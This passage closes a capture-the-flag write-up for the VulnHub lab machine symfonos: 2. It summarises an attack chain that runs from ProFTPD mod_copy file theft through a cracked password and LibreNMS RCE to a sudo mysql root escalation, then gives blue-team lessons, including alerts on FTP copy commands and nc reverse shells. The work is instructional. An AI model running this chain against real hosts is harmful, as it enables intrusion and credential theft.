| 3 | Unauthenticated arbitrary file copy | ProFTPD 1.3.5 `mod_copy` (CVE-2015-3306) | Exfiltrates `/etc/shadow`, `/etc/passwd` |
| 4 | Weak password cracked from shadow | Local crack of `aeolus` hash | Valid SSH credentials (`sergioteamo`) |
| 5 | Localhost-only app exposed via forwarding | LibreNMS on `127.0.0.1:8080` | Hidden attack surface reachable |
| 6 | Authenticated RCE | LibreNMS addhost (CVE-2018-20434) | Shell as `cronus` |
| 7 | Dangerous `sudo` rule | `(root) NOPASSWD: /usr/bin/mysql` | Full root via GTFOBins |

---

## 6. Defensive lessons (blue team)

- **Disable anonymous / guest SMB access.** Require credentials for every share, and
  never map a share to a user's home directory by default.
- **Never store backups of sensitive files where others can read them.** `shadow`
  backups must be root-only and encrypted at rest.
- **Patch ProFTPD** (or disable `mod_copy` if unused). CVE-2015-3306 is a 2015 bug —
  unpatched 1.3.5 is an open door.
- **Enforce strong, unique passwords** so a leaked hash isn't trivially cracked; use
  unique per-service secrets.
- **Bind internal services to loopback *and* restrict them further**, but remember
  localhost binding is not a security boundary for a shell user. Apply auth and patch
  internal apps like LibreNMS; keep them up to date (CVE-2018-20434).
- **Principle of least privilege for `sudo`.** Granting `mysql` (or any shell-capable
  binary) as root is equivalent to granting root. Audit `sudoers` regularly.
- **Monitoring:** alert on SMB guest logins, on FTP `SITE CPFR`/`SITE CPTO` commands,
  on `nc`/reverse-shell process trees under the web user, and on `mysql -e '\!...'`.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry — symfonos: 2: <https://vulnhub.com/entry/symfonos-2,331/>
- Author's page — symfonos 2 boot2root: <https://blog.zay.li/symfonos-2-boot2root-ctf/>
- CVE-2015-3306 (ProFTPD mod_copy): <https://nvd.nist.gov/vuln/detail/CVE-2015-3306>
- Exploit-DB 36742 — ProFTPD 1.3.5 File Copy: <https://www.exploit-db.com/exploits/36742>
- CVE-2018-20434 (LibreNMS RCE): <https://nvd.nist.gov/vuln/detail/CVE-2018-20434>
- GTFOBins — `mysql`: <https://gtfobins.github.io/gtfobins/mysql/#sudo>
- mzfr — Symfonos 2 writeup: <https://blog.mzfr.me/vulnhub-writeups/2019-07-19-symfonos2>
- Samba security / smbclient docs: <https://www.samba.org/>

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with arp-scan
- [ ] `images/02-nmap.png` — port/service scan (21, 22, 80, 139, 445)
- [ ] `images/03-smb-anon.png` — listing/reading the anonymous SMB share
- [ ] `images/04-log-txt.png` — `log.txt` leaking `shadow.bak` + share path
- [ ] `images/05-modcopy.png` — mod_copy copying `shadow.bak`, retrieval over SMB
- [ ] `images/06-ssh-aeolus.png` — SSH as `aeolus`
- [ ] `images/07-portforward.png` — forwarding the localhost LibreNMS app
- [ ] `images/08-cronus-shell.png` — reverse shell as `cronus`
- [ ] `images/09-root-flag.png` — root shell and the root flag

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
